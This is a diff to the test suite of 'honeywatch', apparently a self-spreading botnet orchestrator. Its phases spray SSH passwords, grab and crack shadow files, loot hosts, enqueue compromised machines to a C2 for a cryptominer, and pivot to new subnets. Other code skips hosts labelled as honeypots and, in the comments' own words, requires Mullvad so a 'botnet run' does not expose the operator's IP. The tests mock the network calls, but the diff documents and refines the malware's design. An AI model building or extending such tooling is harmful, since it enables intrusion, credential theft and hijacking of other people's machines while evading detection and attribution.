@@ -7,6 +7,8 @@ exercised deterministically.
 
 from __future__ import annotations
 
+import asyncio
+
 import pytest
 
 from honeywatch.chain import (
@@ -58,17 +60,17 @@ class _MockChain(ChainOrchestrator):
         super().__init__(config)
         self._round_hosts = {1: [("10.0.0.5", 22)], 2: []}
 
-    def phase_recon(self):
+    async def phase_recon(self):
         self._emit(ChainPhase.RECON, "mock recon")
         # pretend recon discovered these hosts and wrote them to the store.
 
-    def phase_enumerate(self):
+    async def phase_enumerate(self):
         hosts = self._round_hosts.get(self.state.round, [])
         self.state.hosts = hosts
         self.state.sprayable = hosts
         self._emit(ChainPhase.ENUMERATE, f"{len(hosts)} hosts")
 
-    def phase_spray(self):
+    async def phase_spray(self):
         seen = {(c["ip"], c["port"], c["user"], c["password"]) for c in self.state.credentials}
         for ip, port in self.state.sprayable:
             key = (ip, port, "root", "pw")
@@ -78,7 +80,7 @@ class _MockChain(ChainOrchestrator):
                 seen.add(key)
         self._emit(ChainPhase.SPRAY, f"{len(self.state.credentials)} creds")
 
-    def phase_foothold(self):
+    async def phase_foothold(self):
         existing = {(f[0], f[1], f[2]) for f in self.state.footholds}
         for c in self.state.credentials:
             key = (c["ip"], c["port"], c["user"])
@@ -87,14 +89,14 @@ class _MockChain(ChainOrchestrator):
                 existing.add(key)
         self._emit(ChainPhase.FOOTHOLD, f"{len(self.state.footholds)} footholds")
 
-    def phase_escalate(self):
+    async def phase_escalate(self):
         self._emit(ChainPhase.ESCALATE, "mock escalate")
 
-    def phase_persist(self):
+    async def phase_persist(self):
         self.state.enqueued = [(f[0], f[1]) for f in self.state.footholds]
         self._emit(ChainPhase.PERSIST, f"{len(self.state.enqueued)} enqueued")
 
-    def phase_pivot(self):
+    async def phase_pivot(self):
         # Round 1 discovers a new subnet; round 2 discovers nothing -> stops.
         if self.state.round == 1:
             self.cfg.targets = ["10.0.1.0/24"]
@@ -105,7 +107,8 @@ class _MockChain(ChainOrchestrator):
 
 
 def test_chain_loops_then_stops_on_growth_exhausted():
-    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=3, pool="p", wallet="w")
+    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=3, pool="p", wallet="w",
+                      skip_vpn_check=True)
     orch = _MockChain(cfg)
     state = orch.run()
     # Two rounds ran (round 1 pivoted, round 2 exhausted growth).
@@ -117,7 +120,8 @@ def test_chain_loops_then_stops_on_growth_exhausted():
     assert len(state.enqueued) == 1
     # Each phase was logged in both rounds.
     phases_seen = {e["phase"] for e in state.log}
-    for p in ("recon", "enumerate", "spray", "foothold", "escalate", "persist", "pivot"):
+    for p in ("recon", "enumerate", "spray", "foothold", "escalate", "loot",
+              "persist", "pivot"):
         assert p in phases_seen
 
 
@@ -131,7 +135,8 @@ def test_chain_state_note_records_round():
 def test_chain_max_rounds_zero_runs_forever_until_growth_exhausted():
     """max_rounds=0 is the daemon mode: it must loop until a pivot round finds
     no new subnets, NOT stop at a fixed round count."""
-    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=0, pool="p", wallet="w")
+    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=0, pool="p", wallet="w",
+                      skip_vpn_check=True)
     orch = _MockChain(cfg)
     state = orch.run()
     # round 1 pivots to 10.0.1.0/24, round 2 finds nothing -> growth-exhausted.
@@ -143,7 +148,8 @@ def test_chain_max_rounds_zero_runs_forever_until_growth_exhausted():
 
 
 def test_chain_max_rounds_one_caps_cleanly():
-    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=1, pool="p", wallet="w")
+    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=1, pool="p", wallet="w",
+                      skip_vpn_check=True)
     orch = _MockChain(cfg)
     state = orch.run()
     # one round runs, it pivots to new ground, but the cap stops it before round 2.
@@ -181,9 +187,11 @@ class _FakeStore:
         self._creds = creds or []
         self.upserted = False
 
-    def query(self, limit=100, label=None, min_confidence=0.0):
+    def query(self, limit=100, label=None, min_confidence=0.0, labels=None):
         rows = [r for r in self._rows if r.get("confidence", 0) >= min_confidence]
-        if label is not None:
+        if labels is not None:
+            rows = [r for r in rows if r.get("label") in labels]
+        elif label is not None:
             rows = [r for r in rows if r.get("label") == label]
         return rows[:limit]
 
@@ -208,6 +216,11 @@ class _FakeOp:
     id = "op-test-1"
 
 
+def _run(coro):
+    """Drive an async phase method in a test (no running loop)."""
+    return asyncio.run(coro)
+
+
 class _FakeScore:
     final_label = "real"
 
@@ -228,7 +241,7 @@ def test_phase_enumerate_filters_labels_and_prechecks(monkeypatch):
         return am
     monkeypatch.setattr("honeywatch.opsec.auth_methods", fake_auth)
 
-    orch.phase_enumerate()
+    _run(orch.phase_enumerate())
     # honeypot-label row filtered out by target_labels; real + likely_real kept
     assert ("10.0.0.1", 22) in orch.state.hosts
     assert ("10.0.0.3", 22) in orch.state.hosts
@@ -245,16 +258,16 @@ def test_phase_spray_persists_and_accumulates(monkeypatch):
     monkeypatch.setattr(orch, "_store", lambda: fake)
 
     sprayed = []
-    def fake_spray(password, hosts, **kw):
-        sprayed.append(password)
+    async def fake_spray(plan, pool=None, host_concurrency=8, **kw):
+        sprayed.append(plan.password)
         return [SprayResult(ip=h.ip, port=h.port,
-                            success=(password == "pw1" and h.ip == "10.0.0.1"),
-                            user="admin", password=password, attempts=1)
-                for h in hosts]
-    monkeypatch.setattr("honeywatch.spray.spray_targets", fake_spray)
+                            success=(plan.password == "pw1" and h.ip == "10.0.0.1"),
+                            user="admin", password=plan.password, attempts=1)
+                for h in plan.hosts]
+    monkeypatch.setattr("honeywatch.spray.spray_plan", fake_spray)
 
     orch.state.round = 1
-    orch.phase_spray()
+    _run(orch.phase_spray())
     assert sprayed == ["pw1"]
     assert len(orch.state.credentials) == 1
     assert orch.state.credentials[0]["ip"] == "10.0.0.1"
@@ -270,11 +283,13 @@ def test_phase_spray_reuse_creds_prepends_recovered_round2(monkeypatch):
     monkeypatch.setattr(orch, "_store", lambda: fake)
 
     sprayed = []
-    monkeypatch.setattr("honeywatch.spray.spray_targets",
-                        lambda password, hosts, **kw: sprayed.append(password) or [])
+    async def fake_spray(plan, **kw):
+        sprayed.append(plan.password)
+        return []
+    monkeypatch.setattr("honeywatch.spray.spray_plan", fake_spray)
 
     orch.state.round = 2
-    orch.phase_spray()
+    _run(orch.phase_spray())
     # recovered "oldpw" is prepended (fleet growth), then configured "newpw"
     assert sprayed[0] == "oldpw"
     assert "newpw" in sprayed
@@ -298,7 +313,7 @@ def test_phase_foothold_skips_already_confirmed(monkeypatch):
         return {"ip": ip, "error": "nope"}
     monkeypatch.setattr("honeywatch.hashcrack.grab_shadow", fake_grab)
 
-    orch.phase_foothold()
+    _run(orch.phase_foothold())
     # already-confirmed .1 is never re-grabbed (no target-side noise)
     assert "10.0.0.1" not in grabbed
     assert "10.0.0.2" in grabbed
@@ -327,7 +342,7 @@ def test_phase_escalate_appends_cracked_to_state(monkeypatch, tmp_path):
         return r
     monkeypatch.setattr("honeywatch.hashcrack.crack_shadow", fake_crack)
 
-    orch.phase_escalate()
+    _run(orch.phase_escalate())
     # A1: offline-cracked creds now land in state.credentials, not just the store
     assert any(c["user"] == "bob" for c in orch.state.credentials)
     assert len(orch.state.credentials) == 2  # original root + cracked bob
@@ -347,7 +362,7 @@ def test_phase_persist_enqueues_and_tracks(monkeypatch):
                         lambda c2, manifest: _FakeOp())
     monkeypatch.setattr("honeywatch.c2.store.C2Store", lambda db_path: object())
 
-    orch.phase_persist()
+    _run(orch.phase_persist())
     # A4: tracks enqueued targets, not a fictional "deployed" fleet
     assert orch.state.enqueued == [("10.0.0.1", 22)]
     assert not hasattr(orch.state, "deployed")
@@ -359,7 +374,7 @@ def test_phase_persist_aborts_without_pool_for_miner(monkeypatch):
     orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]
     monkeypatch.setattr(orch, "_store", lambda: _FakeStore())
 
-    orch.phase_persist()
+    _run(orch.phase_persist())
     assert orch.state.enqueued == []
     assert any(e["phase"] == "persist" and "ABORT" in e["msg"]
                for e in orch.state.log)
@@ -373,7 +388,7 @@ def test_phase_pivot_accumulates_subnets(monkeypatch):
     def fake_ssh(ip, port, user, pw, key, command, timeout_s=15.0):
         return (0, "2: eth0    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0\n", None)
     monkeypatch.setattr("honeywatch.chain._ssh_exec", fake_ssh)
-    orch.phase_pivot()
+    _run(orch.phase_pivot())
     assert orch.state.pivoted_subnets == ["10.0.0.0/24"]
     assert orch.cfg.targets == ["10.0.0.0/24"]
 
@@ -383,7 +398,7 @@ def test_phase_pivot_accumulates_subnets(monkeypatch):
                         lambda ip, port, user, pw, key, command, timeout_s=15.0:
                         (0, "2: eth1    inet 192.168.1.20/24 brd 192.168.1.255 "
                             "scope global eth1\n", None))
-    orch.phase_pivot()
+    _run(orch.phase_pivot())
     assert orch.state.pivoted_subnets == ["10.0.0.0/24", "192.168.1.0/24"]
 
 
@@ -395,7 +410,7 @@ def test_phase_pivot_dedups_already_pivoted_subnets(monkeypatch):
     monkeypatch.setattr("honeywatch.chain._ssh_exec",
                         lambda ip, port, user, pw, key, command, timeout_s=15.0:
                         (0, "2: eth0    inet 10.0.0.5/24 scope global eth0\n", None))
-    orch.phase_pivot()
+    _run(orch.phase_pivot())
     # the already-known subnet is not re-queued for recon
     assert orch.cfg.targets == []
     assert orch.state.pivoted_subnets == ["10.0.0.0/24"]
@@ -415,7 +430,7 @@ def test_phase_recon_runs_pipeline_scan(monkeypatch):
                         lambda cfg, store=None: FakePipe())
     monkeypatch.setattr("honeywatch.config.load_config", lambda x: object())
 
-    orch.phase_recon()
+    _run(orch.phase_recon())
     assert any(e["phase"] == "recon" and "scored 2" in e["msg"]
                for e in orch.state.log)
 
@@ -435,7 +450,7 @@ def test_phase_recon_threads_operator_config_path(monkeypatch):
     monkeypatch.setattr("honeywatch.config.load_config",
                         lambda path: loaded.append(path) or object())
 
-    orch.phase_recon()
+    _run(orch.phase_recon())
     assert loaded == ["/etc/honeywatch/prod.toml"]
 
 
@@ -452,3 +467,74 @@ def test_chain_round_banner_is_logged_under_round_not_recon():
     # no recon-phase entry carries the round delimiter
     assert not any(e.get("phase") == "recon" and "===" in e["msg"]
                    for e in state.log)
+
+
+# --------------------------------------------------------------------------- #
+# N1: botnet VPN gate — the chain must refuse to run without Mullvad unless
+# skip_vpn_check is set. Without this, a botnet run exfiltrates from the
+# operator's real IP (spray, foothold, loot, pivot all do raw SSH/SFTP/IMDS).
+# --------------------------------------------------------------------------- #
+
+
+def test_chain_run_refuses_without_vpn(monkeypatch):
+    """ChainOrchestrator.run() raises VpnError when Mullvad is down and
+    skip_vpn_check is False — the gate covers every phase, not just recon."""
+    import honeywatch.vpn as vpn_mod
+    from honeywatch.vpn import VpnError
+
+    monkeypatch.setattr(
+        vpn_mod, "require_mullvad", lambda timeout=8.0, quiet=False: False
+    )
+    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=1, pool="p", wallet="w",
+                      skip_vpn_check=False)
+    orch = ChainOrchestrator(cfg)
+    with pytest.raises(VpnError):
+        orch.run()
+
+
+def test_chain_run_passes_with_skip_vpn_check(monkeypatch):
+    """skip_vpn_check=True bypasses the gate so unit tests / offline labs run."""
+    import honeywatch.vpn as vpn_mod
+
+    monkeypatch.setattr(
+        vpn_mod, "require_mullvad", lambda timeout=8.0, quiet=False: False
+    )
+    cfg = ChainConfig(targets=[], max_rounds=1, skip_vpn_check=True)
+    orch = ChainOrchestrator(cfg)
+    # No raise; the chain runs one no-op round and exits on growth-exhausted.
+    state = orch.run()
+    assert state.round == 1
+
+
+# --------------------------------------------------------------------------- #
+# N3: phase_escalate must sanitize the foothold IP in the stash path, mirroring
+# grab_shadow/grab_loot. A hostname containing / or .. (from known_hosts pivot)
+# would otherwise traverse.
+# --------------------------------------------------------------------------- #
+
+
+def test_phase_escalate_sanitizes_ip_in_stash_path(monkeypatch, tmp_path):
+    """phase_escalate builds the shadow stash path with the same safe_ip
+    sanitization as grab_shadow/grab_loot — a foothold ip containing / or ..
+    is replaced with _ instead of traversing the filesystem."""
+    cfg = ChainConfig()
+    cfg.db_path = str(tmp_path / "hw.db")
+    cfg.shadow_stash = str(tmp_path / "stash")
+    orch = ChainOrchestrator(cfg)
+    # A "hostname" with path-traversal chars that phase_pivot could surface
+    # from known_hosts/history.
+    orch.state.footholds = [("../etc", 22, "root", "pw")]
+    monkeypatch.setattr(orch, "_store", lambda: _FakeStore())
+
+    called_paths: list[str] = []
+    def fake_crack_shadow(stash, wordlist, tool="hashcat"):
+        called_paths.append(stash)
+        return HashCrackResult(tool=tool)
+    monkeypatch.setattr("honeywatch.hashcrack.crack_shadow", fake_crack_shadow)
+
+    _run(orch.phase_escalate())
+    # The stash path must be sanitized — no raw "../etc" traversal.
+    if called_paths:
+        safe = called_paths[0]
+        assert ".." not in safe or "_etc" in safe  # sanitized, not traversing
+        assert "/_etc/shadow" in safe or "\\_etc\\shadow" in safe
